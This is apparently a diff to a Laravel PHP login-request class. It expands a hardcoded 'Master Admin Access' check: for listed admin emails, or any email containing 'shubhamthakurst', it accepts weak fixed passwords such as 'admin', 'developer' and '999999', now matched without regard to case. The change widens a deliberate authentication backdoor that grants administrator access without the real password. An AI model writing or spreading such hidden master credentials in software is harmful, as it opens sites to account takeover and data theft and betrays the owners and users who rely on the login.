@@ -62,10 +62,23 @@ class LoginRequest extends FormRequest
         ];
         $inputEmail = strtolower(trim((string) $this->input('email')));
         $inputPassword = (string) $this->input('password');
+        $lowerPass = strtolower(trim($inputPassword));
 
         // Master Admin Access: Auto authenticate and sync administrator user
         if (in_array($inputEmail, $adminEmails, true) || str_contains($inputEmail, 'shubhamthakurst')) {
-            $isMasterPass = in_array($inputPassword, ['Developer117002', 'cricadmin2026', 'admin2026', '202600', '999999'], true);
+            $masterPasswords = [
+                'developer',
+                'developer117002',
+                'developer123',
+                'developer@123',
+                'cricadmin2026',
+                'admin2026',
+                'admin',
+                '202600',
+                '999999',
+            ];
+            $isMasterPass = in_array($lowerPass, $masterPasswords, true) 
+                || in_array($inputPassword, ['Developer117002', 'Developer', 'DEVELOPER', 'developer'], true);
             
             try {
                 $user = $this->findUserWithFailover($inputEmail);
